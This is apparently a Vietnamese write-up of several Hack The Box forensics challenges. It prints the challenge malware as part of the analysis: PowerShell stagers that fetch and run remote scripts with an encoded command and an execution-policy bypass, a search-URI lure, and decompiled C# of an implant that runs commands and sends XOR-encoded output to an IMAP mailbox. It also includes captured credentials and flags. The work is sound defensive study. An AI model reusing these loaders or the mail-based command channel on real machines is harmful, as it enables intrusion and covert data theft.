![image](https://github.com/user-attachments/assets/94a89594-6f36-4233-9bcf-da33d5406dc2)

# _Thorin’s Amulet_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/1f8fd6b4-c229-4ca2-aa4e-ce5120d5db9e)

Nhận được file ps1

```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

Decode base64 nhận được 1 đường link, thử truy dùng port để truy cập nhưng kh đc

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

Đọc kĩ lại mô tả thì thấy có NOTE

> Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.

Mình dùng kali để add IP và domain vào /etc/host/

![image](https://github.com/user-attachments/assets/639b3022-3acc-40ac-be10-345154933c52)

Truy cập thử, thì nhận được file ps1 tiếp

```powershell
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

Lệnh trên thực hiện tải file ps1 và chạy với lệnh Bypass, muốn xem file có gì thì mình dùng curl kết hợp với KEY xác thực

![image](https://github.com/user-attachments/assets/f404de2a-bac1-4d15-a224-45825120d93a)

Decode là nhận được flag

```
HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
```

# _A new hire_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/e9725ec1-0825-45f3-b533-a3cb000b9160)

Tiếp tục là file email.eml, mở ra xem 

![image](https://github.com/user-attachments/assets/291d60c8-f0a1-41fa-860e-fcc4ffbf43ca)

Hmm khá giống với thử thách trước, add IP và domain vô /etc/hosts/

Truy cập http://storage.microsoftcloudservices.com:[PORT]//index.php

![image](https://github.com/user-attachments/assets/05a439ab-318b-4540-b8f9-47677819ce09)

Xem source, chú ý đến đoạn sau

```html
  <div class="blur-overlay">
    <button class="view-button" onclick="getResume()">View Full Resume</button>
  </div>
  <script defer="defer">
    setTimeout(() => {
      document.getElementById('loading').style.display = 'none';
      document.getElementById('main-content').style.display = 'flex';
    }, 5000);

    function getResume() {
      window.location.href=`search:displayname=Downloads&subquery=\\\\${window.location.hostname}@${window.location.port}\\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\`;
    }
  </script>
```

Trang web bị blur, mình thử bỏ nó đi thì nhận được nội dung giống như 1 CV, kh có gì đáng chú ý

![image](https://github.com/user-attachments/assets/7d5f0228-6d81-4d0b-82ee-fb8e990d5665)

Nhìn xuống tiếp hàm getResume(), thấy được sử dụng JavaScript để điều khiển hiển thị nội dung và chuyển hướng người dùng đến một tệp \\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\, nhưng mình nhấn View Full Resume khi trang web đang bị blur thì kh thấy gì

Từ đây mình nghĩ có thể lấy đường link _http://storage.microsoftcloudservices.com:[PORT]//index.php_  thay index.php thành \\3fe1690d955e8fd2a0b282501570e1f4\\resumes\\ và truy cập trực tiếp luôn

![image](https://github.com/user-attachments/assets/7c4e4922-6dc1-4d35-8971-8e2b92d44b08)

Tải file Resume.pdf.link về 

![image](https://github.com/user-attachments/assets/d37b2856-beab-4091-9bc9-cad6a70802aa)

Decode base64

![image](https://github.com/user-attachments/assets/f5b5a99a-28aa-44ff-b378-518aa73ef0ff)

Có 1 đoạn pws được dùng để mở và truy cập các đường link, truy cập vô client.py

![image](https://github.com/user-attachments/assets/1944f076-b948-47c5-afb7-fc71aef2bb7e)

Thấy có 1 key và 1 data khá dài, bên dưới dùng lệnh xor key với data và chạy lệnh exec để thực thi, mình thử thay thành print để in luôn kết quả nhưng vẫn bị mã hóa, loay hoay mãi thì thử base64 decrypt key thì có được flag :v Lừa vl

```
HTB{4PT_28_4nd_m1cr0s0ft_s34rch=1n1t14l_4cc3s!!}
```
# _Silent Trap_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/4b3da520-f51c-4f57-8c1e-fa0b1c4b8d3d)

Bài cho file pcapng, phân tích và trả lời 6 câu hỏi

>1. What is the subject of the first email that the victim opened and replied to?

Follow HTTP stream 4, thấy được cuộc giao tiếp giữa client và server

![image](https://github.com/user-attachments/assets/646b0dd0-57d2-4d34-8156-46a77c7e8f9c)

Thực hiện GET request xem trước email (_action=preview) trong hộp thư đến (_mbox=INBOX) với UID 71 => opened

Sau đó xuống dưới, thực hiện tiếp GET request với email trên, yêu cầu tải 1 hình ảnh => replied

```
Answer: Game Crash on Level 5
```

>2. On what date and time was the suspicious email sent? (Format: YYYY-MM-DD_HH:MM) (for example: 1945-04-30_12:34)

Lúc đang làm thì mình ngồi xem HTTP stream 1, thấy có một GET request lấy danh sách email trong hộp thư đến, server sẽ response danh sách dưới dạng json

![image](https://github.com/user-attachments/assets/520b3411-3222-41b1-91e0-25e629433673)

Mình thấy được 1 email với tiêu đề _Bug Report - In-game Imbalance Issue in Eldoria_, Eldoria có gì đó giống với tên giải nên mình lấy luôn time của cái email đó

Nhập vô thấy correct :v
```
\nthis.add_message_row(72,{\"subject\":\"Bug Report - In-game Imbalance Issue in Eldoria\",\"fromto\":\"<span class=\\\"adr\\\"><span title=\\\"proplayer@email.com\\\" class=\\\"rcmContactAddress\\\">proplayer@email.com</span></span>\",\"date\":\"Today 15:46\",\"size\":\"13 KB\"},{\"ctype\":\"multipart/mixed\",\"mbox\":\"INBOX\"},false)
```

```
Answer: 2025-02-24_15:46
```
>3. What is the MD5 hash of the malware file?

Export object HTTP, thấy có 1 file zip, khả năng đây sẽ chứa malware

![image](https://github.com/user-attachments/assets/81b78613-8a31-4d4b-a14e-d04854d6bddb)

Save về không unzip được, thử crack cũng kh được, thì khả năng mật khẩu sẽ đc tìm thấy trong pcap

Mình tìm đến stream 8, xem cuộc hội thoại giữa client và server về email liên quan đến malware kia

![image](https://github.com/user-attachments/assets/011f5dbf-f2c0-48e1-89f2-3ea53c8d6cc0)

Mình đoán sẽ có pass unzip ở trong này, thử tìm password thì ra

![image](https://github.com/user-attachments/assets/b596a8bf-2f0a-4ef9-a61b-a850e7a674d9)

Unzip nhận được 1 file Eldoria_Balance_Issue_Report.pdf.exe

Giờ đi tìm md5 thôi, mình sử dụng Virustotal

![image](https://github.com/user-attachments/assets/329393e8-f46f-4de2-b36e-57d84adae115)

Đỏ ngàu luôn mà 😥

```
Answer: 5236676355a82362102e0d2ae5274a89cd9198e23bcf0a83609aea15fa111604
```

>4. What credentials were used to log into the attacker's mailbox? (Format: username:password)

Lúc mới vào làm, thì mình thấy có khá nhiều packet, nên có hỏi AI xem cần chú ý vào những protocol nào thì có được chỉ rằng là IMAP

Thử lọc IMAP thì có đc luôn username và password

![image](https://github.com/user-attachments/assets/1d586b09-1b7e-4e2e-b9a4-38908ecbdeff)

Còn nếu làm bản chất thì phải rev con malware kia, dùng die để xác định thư viện

![image](https://github.com/user-attachments/assets/9cdca5ac-0edb-46a6-812d-484aeb3814bc)

.Net thì dùng dotpeek hoặc ilspy để decomplie, mình dùng dotpeek

![image](https://github.com/user-attachments/assets/27364a2e-ed4f-4758-8a0e-7791a2c2b5f1)

Chương trình trên sử dụng C# để kết nối đến IMAP server sử dụng giao thức TCP và SSL/TLS

Nhìn vào hàm creds, đây là hàm lưu thông tin đăng nhập để có thể xác thực với máy chủ email mail.korptech.net

```
Answer: proplayer@email.com:completed
```
>5. What is the name of the task scheduled by the attacker?

Khi làm thì mình cần tìm câu trả lời càng sớm càng tốt, nên đã kiểu đoán mò khá nhiều, mình đã follow hết các stream liên quan đến IMAP nhưng kh thấy có task scheduled nào của attacker, nên mình nghĩ khả năng rất cao là nó nằm trong đống bị mã hóa này

![image](https://github.com/user-attachments/assets/35f1b6a7-933d-4a3f-a2d0-9d576a5f5eba)


Từ đây mình sẽ đi vào phân tích đoạn code C#, chú ý đến các hàm sau

```C#
private static void create(string text)
    {
      text = "From: " + Environment.UserName + "\r\nSubject: " + DateTime.UtcNow.ToString() + "_report_" + Program.comp_id + "\r\n\r\n" + text;
      byte[] bytes = Encoding.ASCII.GetBytes("$ APPEND Inbox {" + text.Length.ToString() + "}\r\n" + text + "\r\n");
      Task.Factory.FromAsync<byte[], int, int>(new Func<byte[], int, int, AsyncCallback, object, IAsyncResult>(((Stream) Program.ssl).BeginWrite), new Action<IAsyncResult>(((Stream) Program.ssl).EndWrite), bytes, 0, bytes.Length, (object) Program.ssl);
    }
```

Hàm create tạo một email cơ bản với thông tin người gửi, chủ đề (dựa trên thời gian và comp_id), và nội dung text. Sau đó, nó gửi email này lên máy chủ IMAP (vào thư mục "Inbox") thông qua kết nối mạng bảo mật (Program.ssl). Nội dung gửi chính là đoạn văn bản bị mã hóa kia

Tiếp theo

```C#
private static void execute(string[] commands)
    {
      try
      {
        Program.connect(Program.creds.Split(':')[2], 143);
        Program.Login(Program.creds.Split(':')[0], Program.creds.Split(':')[1]);
      }
      catch
      {
        try
        {
          Program.connect(Program.r_creds.Split(':')[2], 143);
          Program.Login(Program.r_creds.Split(':')[0], Program.r_creds.Split(':')[1]);
        }
        catch
        {
        }
      }
      foreach (string command in commands)
      {
        if (command.Contains("change_"))
          Program.change(command);
        else
          Program.create(Convert.ToBase64String(Program.xor(Encoding.UTF8.GetBytes(Program.cmd(command)))));
      }
    }
```
Hàm execute thực hiện cố gắng kết nối đến máy chủ email bằng tài khoản chính (proplayer@email.com) , nếu không được thì dùng tài khoản dự phòng (proplayer1@email.com)
- Nếu không phải lệnh change_ thì chạy lệnh, mã hóa kết quả, và gửi lên máy chủ dưới dạng email

Tiếp theo là hàm mã hóa xor

![image](https://github.com/user-attachments/assets/ac1e4ac2-67ba-4486-b534-ed3897cd25a2)

Hàm sử dụng một mảng byte cố định gồm 256 phần tử làm khóa (key)

Đến đây mình bị stuck vì rõ ràng hàm tên là Xor nhưng mình đã thử rất nhiều cách để giải mã mà kh thể nào ra được

# _Cave Expedition_ _(FORSENSICS)_

![image](https://github.com/user-attachments/assets/7483bc04-6ee6-4cd3-be34-48f176dce7bf)

Bài cho tất cả các tệp log được sắp xếp theo bảng chữ cái hmm, ngồi đọc chay hết chắc cũng ốm mất

Dùng tool Evtxcmd để trích xuất hết ra csv rồi ngồi lọc thôi








